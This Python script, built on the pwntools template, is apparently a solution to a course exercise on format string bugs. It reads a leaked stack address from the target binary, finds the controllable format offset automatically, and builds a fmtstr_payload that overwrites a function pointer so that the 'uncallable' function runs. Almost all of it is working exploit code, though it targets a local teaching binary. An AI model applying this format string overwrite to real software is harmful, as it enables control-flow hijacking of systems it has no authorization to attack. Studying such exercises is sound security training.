#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise5/exercise5b'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break main
break *get_number+227
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================\
r = start()

# from ghidra: (*functions[(int)(local_fc & 0xf)])();
# we need to trick program into executing func0, at whose address we store uncallable instead
n_specifier_string = r.recvline()
n_specifier_address = n_specifier_string.split(b" ")[3].strip(b"\n")
n_specifier_address = int(n_specifier_address, 16)

# by looking at the stack, we see that n_specifier value is just before func0
# hence the stack address of func1 is just 4 bytes after &n
func0_address = n_specifier_address + 4
uncallable_address = (ELF(exe).symbols['uncallable'])


# from https://tc.gts3.org/cs6265/2019/tut/tut05-fmtstr.html
# much easier with respect to manual writing exploiting %n specifier
# implement functions in pwnlib.fmtstr documentation:
def exec_fmt(payload):
    p = start()
    p.sendline(payload)
    return p.recvall()


# automatically get controlled_fmt_offset
autofmt = FmtStr(exec_fmt)
controlled_fmt_offset = autofmt.offset

# automatically get correct payload
payload = fmtstr_payload(controlled_fmt_offset, {func0_address: uncallable_address})

r.sendline(payload)
print(r.recvall(timeout=2))
